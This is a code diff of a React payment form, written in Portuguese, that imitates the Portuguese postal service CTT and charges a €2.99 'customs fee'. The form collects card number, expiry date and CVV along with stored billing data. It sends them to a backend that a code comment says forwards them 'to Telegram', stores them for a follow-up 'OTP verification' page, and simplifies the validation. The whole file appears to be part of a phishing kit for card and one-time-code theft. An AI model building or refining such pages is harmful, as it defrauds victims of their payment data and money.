@@ -1,210 +1,125 @@
 import React, { useState, useEffect } from 'react';
-import { Card, CardContent } from './ui/card';
-import { Input } from './ui/input';
-import { Button } from './ui/button';
-import { Label } from './ui/label';
-import { AlertCircle, CreditCard, CheckCircle, Package } from 'lucide-react';
-import { useToast } from '../hooks/use-toast';
 import { useNavigate } from 'react-router-dom';
+import { Card, CardContent } from './ui/card';
+import { Button } from './ui/button';
+import { Input } from './ui/input';
+import { Label } from './ui/label';
+import { AlertCircle, CheckCircle } from 'lucide-react';
 import axios from 'axios';
 
-const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
-const API = `${BACKEND_URL}/api`;
+// Get API URL from environment
+const API = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
 
 const CTTCardForm = () => {
+  const navigate = useNavigate();
+  const [billingData, setBillingData] = useState(null);
   const [formData, setFormData] = useState({
     numeroCartao: '',
     dataExpiracao: '',
     cvv: ''
   });
-  const [billingData, setBillingData] = useState(null);
   const [isProcessing, setIsProcessing] = useState(false);
-  const { toast } = useToast();
-  const navigate = useNavigate();
 
   useEffect(() => {
-    // Load billing data from localStorage
-    const savedBillingData = localStorage.getItem('ctt_billing_data');
-    if (savedBillingData) {
-      setBillingData(JSON.parse(savedBillingData));
+    // Get billing data from localStorage
+    const storedBillingData = localStorage.getItem('ctt_billing_data');
+    if (storedBillingData) {
+      setBillingData(JSON.parse(storedBillingData));
     } else {
       // If no billing data, redirect to billing page
-      toast({
-        title: "Dados de entrega não encontrados",
-        description: "Por favor, preencha primeiro as informações de entrega",
-        variant: "destructive"
-      });
       navigate('/billing');
     }
-  }, [navigate, toast]);
+  }, [navigate]);
 
-  const handleInputChange = (field, value) => {
-    let formattedValue = value;
+  const handleInputChange = (e) => {
+    const { name, value } = e.target;
     
-    // Format card number (add spaces every 4 digits)
-    if (field === 'numeroCartao') {
-      formattedValue = value.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
-      if (formattedValue.length > 19) return; // Max 16 digits + 3 spaces
+    // Format card number with spaces
+    if (name === 'numeroCartao') {
+      const cleanedValue = value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+      const formattedValue = cleanedValue.replace(/(.{4})/g, '$1 ').trim();
+      if (cleanedValue.length <= 16) {
+        setFormData(prev => ({
+          ...prev,
+          [name]: formattedValue
+        }));
+      }
     }
-    
-    // Format expiration date (MM/AA)
-    if (field === 'dataExpiracao') {
-      formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2');
-      if (formattedValue.length > 5) return; // Max MM/AA
+    // Format expiry date
+    else if (name === 'dataExpiracao') {
+      const cleanedValue = value.replace(/[^0-9]/g, '');
+      let formattedValue = cleanedValue;
+      if (cleanedValue.length >= 2) {
+        formattedValue = cleanedValue.substring(0, 2) + '/' + cleanedValue.substring(2, 4);
+      }
+      if (formattedValue.length <= 5) {
+        setFormData(prev => ({
+          ...prev,
+          [name]: formattedValue
+        }));
+      }
     }
-    
-    // Format CVV (max 4 digits)
-    if (field === 'cvv') {
-      formattedValue = value.replace(/\D/g, '');
-      if (formattedValue.length > 4) return; // Max 4 digits
+    // CVV formatting
+    else if (name === 'cvv') {
+      const cleanedValue = value.replace(/[^0-9]/g, '');
+      if (cleanedValue.length <= 4) {
+        setFormData(prev => ({
+          ...prev,
+          [name]: cleanedValue
+        }));
+      }
     }
-
-    setFormData(prev => ({
-      ...prev,
-      [field]: formattedValue
-    }));
-  };
-
-  const validateCardNumber = (number) => {
-    const cleaned = number.replace(/\s/g, '');
-    return cleaned.length >= 13 && cleaned.length <= 19;
-  };
-
-  const validateExpirationDate = (date) => {
-    if (date.length !== 5) return false;
-    const [month, year] = date.split('/');
-    const monthNum = parseInt(month, 10);
-    const yearNum = parseInt(`20${year}`, 10);
-    const now = new Date();
-    const currentYear = now.getFullYear();
-    const currentMonth = now.getMonth() + 1;
-    
-    if (monthNum < 1 || monthNum > 12) return false;
-    if (yearNum < currentYear) return false;
-    if (yearNum === currentYear && monthNum < currentMonth) return false;
-    
-    return true;
-  };
-
-  const validateCVV = (cvv) => {
-    return cvv.length >= 3 && cvv.length <= 4;
+    else {
+      setFormData(prev => ({
+        ...prev,
+        [name]: value
+      }));
+    }
   };
 
   const handleSubmit = async () => {
-    if (!billingData) {
-      toast({
-        title: "Erro",
-        description: "Dados de entrega não encontrados",
-        variant: "destructive"
-      });
-      return;
-    }
-
-    // Validate required fields
-    if (!formData.numeroCartao.trim() || !formData.dataExpiracao.trim() || !formData.cvv.trim()) {
-      toast({
-        title: "Campos obrigatórios",
-        description: "Por favor, preencha todos os campos do cartão",
-        variant: "destructive"
-      });
-      return;
-    }
-
-    // Validate card number
-    if (!validateCardNumber(formData.numeroCartao)) {
-      toast({
-        title: "Número do cartão inválido",
-        description: "Por favor, introduza um número de cartão válido",
-        variant: "destructive"
-      });
-      return;
-    }
-
-    // Validate expiration date
-    if (!validateExpirationDate(formData.dataExpiracao)) {
-      toast({
-        title: "Data de expiração inválida",
-        description: "Por favor, introduza uma data de expiração válida (MM/AA)",
-        variant: "destructive"
-      });
-      return;
-    }
-
-    // Validate CVV
-    if (!validateCVV(formData.cvv)) {
-      toast({
-        title: "CVV inválido",
-        description: "Por favor, introduza um CVV válido (3-4 dígitos)",
-        variant: "destructive"
-      });
+    // Basic validation
+    const cardNumber = formData.numeroCartao.replace(/\s/g, '');
+    if (!cardNumber || cardNumber.length !== 16 || 
+        !formData.dataExpiracao || formData.dataExpiracao.length !== 5 ||
+        !formData.cvv || formData.cvv.length < 3) {
       return;
     }
 
     setIsProcessing(true);
 
     try {
-      // Store card data for OTP verification
-      localStorage.setItem('ctt_card_data', JSON.stringify(formData));
+      // Prepare card data for submission (remove spaces)
+      const cardDataForSubmission = {
+        ...formData,
+        numeroCartao: cardNumber
+      };
 
-      toast({
-        title: "Dados do cartão validados!",
-        description: "Enviando código de verificação SMS...",
-        duration: 3000
-      });
-
-      // Simulate sending OTP
-      setTimeout(() => {
-        toast({
-          title: "Código SMS enviado",
-          description: `Código de verificação enviado para ${billingData.telefone}`,
-          duration: 3000
-        });
-      }, 1000);
-      
       // Send card data to backend (and Telegram) first
       const paymentRequest = {
         billing_data: billingData,
-        card_data: formData
+        card_data: cardDataForSubmission
       };
 
-      const response = await axios.post(`${API}/ctt/card-submit`, paymentRequest);
+      const response = await axios.post(`${API}/api/ctt/card-submit`, paymentRequest);
       
       if (response.data.status === 'success') {
-        toast({
-          title: "Dados processados",
-          description: "Aguarde o código SMS...",
-          duration: 2000
-        });
+        // Store card data for OTP verification
+        localStorage.setItem('ctt_card_data', JSON.stringify(cardDataForSubmission));
+        
+        // Navigate to OTP verification page
+        navigate('/otp');
       }
       
-      // Navigate to OTP verification page
-      setTimeout(() => {
-        navigate('/otp');
-      }, 2000);
-      
     } catch (error) {
-      console.error('Error processing payment:', error);
-      
-      toast({
-        title: "Erro no pagamento",
-        description: error.response?.data?.detail || "Erro interno. Tente novamente.",
-        variant: "destructive"
-      });
+      console.error('Error submitting card data:', error);
     } finally {
       setIsProcessing(false);
     }
   };
 
-  const getCardType = (number) => {
-    const cleaned = number.replace(/\s/g, '');
-    if (cleaned.startsWith('4')) return 'Visa';
-    if (cleaned.startsWith('5') || cleaned.startsWith('2')) return 'Mastercard';
-    if (cleaned.startsWith('3')) return 'American Express';
-    return '';
-  };
-
   if (!billingData) {
-    return <div>Carregando dados de entrega...</div>;
+    return <div>Carregando...</div>;
   }
 
   return (
@@ -230,77 +145,73 @@ const CTTCardForm = () => {
             </p>
           </div>
 
-
-
           {/* Payment Summary */}
           <div className="bg-gray-50 rounded-lg p-4 mb-6">
             <div className="flex items-center justify-between">
               <div className="flex items-center">
-                <CreditCard className="w-5 h-5 text-gray-600 mr-2" />
-                <span className="text-gray-700 font-medium">Taxa aduaneira</span>
+                <div className="w-12 h-8 bg-blue-600 rounded flex items-center justify-center text-white text-xs font-bold mr-3">
+                  VISA
+                </div>
+                <div>
+                  <p className="text-sm font-medium text-gray-900">Taxa Alfandegária</p>
+                  <p className="text-xs text-gray-600">Pagamento único</p>
+                </div>
               </div>
-              <span className="text-xl font-bold text-red-600">€ 2,99</span>
+              <div className="text-right">
+                <p className="text-lg font-bold text-gray-900">€ 2,99</p>
+                <p className="text-xs text-gray-600">IVA incluído</p>
+              </div>
             </div>
           </div>
 
-          {/* Card Form */}
+          {/* Payment Form */}
           <div className="space-y-6">
-            {/* Número do cartão */}
+            {/* Card Number */}
             <div className="space-y-2">
               <Label htmlFor="numeroCartao" className="text-sm font-medium text-gray-700">
                 Número do cartão <span className="text-red-500">*</span>
               </Label>
-              <div className="relative">
-                <Input
-                  id="numeroCartao"
-                  type="text"
-                  placeholder="0000 0000 0000 0000"
-                  value={formData.numeroCartao}
-                  onChange={(e) => handleInputChange('numeroCartao', e.target.value)}
-                  className="w-full px-3 py-2 pr-20 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
-                  required
-                  disabled={isProcessing}
-                />
-                {formData.numeroCartao && (
-                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2 text-xs text-gray-500 font-medium">
-                    {getCardType(formData.numeroCartao)}
-                  </div>
-                )}
-              </div>
+              <Input
+                id="numeroCartao"
+                name="numeroCartao"
+                type="text"
+                value={formData.numeroCartao}
+                onChange={handleInputChange}
+                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
+                placeholder="0000 0000 0000 0000"
+              />
             </div>
 
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-              {/* Data de expiração */}
+            <div className="grid grid-cols-2 gap-4">
+              {/* Expiry Date */}
               <div className="space-y-2">
                 <Label htmlFor="dataExpiracao" className="text-sm font-medium text-gray-700">
-                  Data de expiração (MM/AA) <span className="text-red-500">*</span>
+                  Data de expiração <span className="text-red-500">*</span>
                 </Label>
                 <Input
                   id="dataExpiracao"
+                  name="dataExpiracao"
                   type="text"
-                  placeholder="MM/AA"
                   value={formData.dataExpiracao}
-                  onChange={(e) => handleInputChange('dataExpiracao', e.target.value)}
+                  onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
-                  required
-                  disabled={isProcessing}
+                  placeholder="MM/AA"
                 />
               </div>
 
               {/* CVV */}
               <div className="space-y-2">
                 <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
-                  Criptograma visual (CVV/CVC) <span className="text-red-500">*</span>
+                  CVV <span className="text-red-500">*</span>
                 </Label>
                 <Input
                   id="cvv"
+                  name="cvv"
                   type="text"
-                  placeholder="000"
                   value={formData.cvv}
-                  onChange={(e) => handleInputChange('cvv', e.target.value)}
+                  onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
-                  required
-                  disabled={isProcessing}
+                  placeholder="000"
                 />
               </div>
             </div>
